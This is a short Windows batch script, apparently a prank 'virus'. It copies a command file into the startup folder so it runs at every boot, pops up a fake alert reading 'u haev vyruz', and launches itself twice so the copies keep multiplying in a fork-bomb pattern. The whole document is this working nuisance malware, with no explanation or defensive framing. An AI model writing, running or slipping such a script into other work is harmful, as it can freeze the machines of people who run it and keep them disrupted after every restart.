cp new 1.cmd %startupFolder%
echo MsgBox "oh no", vbCritical, "u haev vyruz" >> temp.vbs
start wscript C:\Users\orso\Desktop3\temp.vbs & start call "./new 1.cmd" & start call "./new 1.cmd"
